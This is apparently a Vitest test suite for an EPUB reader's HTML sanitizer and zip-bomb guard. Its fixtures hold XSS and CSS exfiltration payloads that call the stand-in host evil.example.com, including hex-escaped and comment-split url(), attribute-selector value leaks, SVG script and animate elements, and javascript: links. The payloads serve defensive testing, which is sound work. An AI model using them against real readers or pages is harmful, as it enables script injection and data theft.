import { describe, expect, it } from 'vitest'
import {
  CONTENT_CSP,
  sanitizeSectionDocument,
  validateEpubArchiveBounds
} from '@/engines/epub/epubEngine'
import {
  createCleanEpubBuffer,
  createZipBombArchiveBuffer
} from '../fixtures/bookFixtures'

describe('EPUB sanitizer, Zip Bomb guard, and <base>/CSP compatibility (US3 - TDD)', () => {
  it('accepts clean EPUB archives and rejects zip bomb archives before ePub parsing', async () => {
    const clean = await createCleanEpubBuffer()
    await expect(validateEpubArchiveBounds(clean)).resolves.toBeUndefined()

    const tooManyEntries = await createZipBombArchiveBuffer('too-many-entries')
    await expect(validateEpubArchiveBounds(tooManyEntries)).rejects.toThrow(/엔트리|Zip|아카이브/)

    const oversized = await createZipBombArchiveBuffer('oversized-uncompressed')
    await expect(validateEpubArchiveBounds(oversized)).rejects.toThrow(/크기|용량|아카이브/)
  })

  it('strips active elements, SVG script/foreignObject/use/animate, dangerous CSS @import/url, and prepends hardened CSP meta', () => {
    const html = `<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:xlink="http://www.w3.org/1999/xlink">
  <head>
    <base href="https://evil.example.com/" />
    <meta http-equiv="refresh" content="0;url=https://evil.example.com/" />
    <style>
      @import url("https://evil.example.com/leak.css");
      .bad { width: expression(alert(1)); background: url("javascript:alert(2)"); }
      .good { color: #111827; }
    </style>
    <script>alert(1)</script>
  </head>
  <body onload="evil()">
    <p id="safe" onclick="evil()">정상 본문</p>
    <a id="badlink" href="javascript:alert(1)">위험 링크</a>
    <img id="badimg" src="data:image/svg+xml;utf8,%3Csvg%3E" />
    <svg viewBox="0 0 10 10">
      <script>evilSvg()</script>
      <foreignObject><div>evil</div></foreignObject>
      <use xlink:href="https://evil.example.com/x.svg#id"></use>
      <animate attributeName="href" values="javascript:alert(3)"></animate>
      <set attributeName="onbegin" to="evil()"></set>
      <circle cx="5" cy="5" r="4"></circle>
    </svg>
  </body>
</html>`

    const doc = new DOMParser().parseFromString(html, 'text/html')
    sanitizeSectionDocument(doc)

    expect(doc.querySelectorAll('script, iframe, base, foreignObject, use, animate, set')).toHaveLength(0)
    expect(doc.querySelector('meta[http-equiv="refresh"]')).toBeNull()
    expect(doc.body.getAttribute('onload')).toBeNull()
    expect(doc.getElementById('safe')?.getAttribute('onclick')).toBeNull()
    expect(doc.getElementById('badlink')?.getAttribute('href')).toBeNull()
    expect(doc.getElementById('badimg')?.getAttribute('src')).toBeNull()
    expect(doc.querySelector('svg circle')).not.toBeNull()

    const styleText = doc.querySelector('style')?.textContent || ''
    expect(styleText).not.toMatch(/@import/i)
    expect(styleText).not.toMatch(/expression\(/i)
    expect(styleText).not.toMatch(/javascript:/i)
    expect(styleText).toContain('.good { color: #111827; }')

    const firstHeadMeta = doc.head.firstElementChild
    expect(firstHeadMeta?.tagName.toLowerCase()).toBe('meta')
    expect(firstHeadMeta?.getAttribute('http-equiv')).toBe('Content-Security-Policy')
    expect(firstHeadMeta?.getAttribute('content')).toBe(CONTENT_CSP)
    expect(CONTENT_CSP).toContain("default-src 'none'")
    expect(CONTENT_CSP).toContain("base-uri 'none'")
    expect(CONTENT_CSP).toContain("connect-src 'none'")
  })

  it('blocks CSS hex escapes, comment splits, image-set/var URLs, attribute exfil, SVG mpath/feImage/discard, link preload, srcset/poster/ping/background, and malformed CSS (T010)', () => {
    const html = `<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <link rel="preload" href="https://evil.example.com/font.woff2" as="font" />
    <link rel="stylesheet" href="styles/book.css" />
    <style>
      @namespace svg "http://www.w3.org/2000/svg";
      @font-face { font-family: Evil; src: url("https://evil.example.com/f.woff2"); }
      .hex { background-image: u\\72l("h\\74tps://evil.example.com/hex"); }
      .cmt { background: /*x*/url/*y*/("https://evil.example.com/cmt"); }
      .nested { background-image: image-set(url("https://evil.example.com/img.png") 1x); }
      .varleak { --u: url("https://evil.example.com/v"); background: var(--u); }
      input[value^="a"] { background: url("https://evil.example.com/leak?v=a"); }
      .ok { font-size: 1.1rem; line-height: 1.6; }
    </style>
    <style id="broken-css">.broken { color: red; background: url("https://evil.example.com/b</style>
  </head>
  <body background="https://evil.example.com/bg.png">
    <img id="srcset-img" srcset="https://evil.example.com/1x.png 1x, local.png 2x" src="local.png" />
    <video id="vid" poster="https://evil.example.com/poster.jpg"></video>
    <a id="ping-link" href="#ch2" ping="https://evil.example.com/track">Next</a>
    <p style="background-image: u\\72l('https://evil.example.com/inline')" id="inline-p">본문</p>
    <svg viewBox="0 0 10 10">
      <style>.svgbad { fill: url("https://evil.example.com/s"); }</style>
      <mpath href="#p"></mpath>
      <feImage href="https://evil.example.com/fe.png"></feImage>
      <discard begin="1s"></discard>
      <rect width="5" height="5"></rect>
    </svg>
  </body>
</html>`

    const doc = new DOMParser().parseFromString(html, 'text/html')
    sanitizeSectionDocument(doc)

    expect(doc.querySelector('link[rel="preload"]')).toBeNull()
    expect(doc.querySelector('link[rel="stylesheet"]')).not.toBeNull()
    expect(doc.body.getAttribute('background')).toBeNull()
    expect(doc.getElementById('srcset-img')?.getAttribute('srcset')).toBeNull()
    expect(doc.getElementById('vid')?.getAttribute('poster')).toBeNull()
    expect(doc.getElementById('ping-link')?.getAttribute('ping')).toBeNull()
    expect(doc.querySelectorAll('mpath, feImage, discard')).toHaveLength(0)
    expect(doc.querySelector('svg rect')).not.toBeNull()

    const styles = Array.from(doc.querySelectorAll('style'))
      .map((el) => el.textContent || '')
      .join('\n')
    expect(styles).not.toContain('evil.example.com')
    expect(styles).not.toMatch(/@namespace/i)
    expect(styles).not.toMatch(/@font-face/i)
    expect(styles).toContain('font-size')

    const inlineStyle = doc.getElementById('inline-p')?.getAttribute('style') || ''
    expect(inlineStyle).not.toContain('evil.example.com')
  })
})
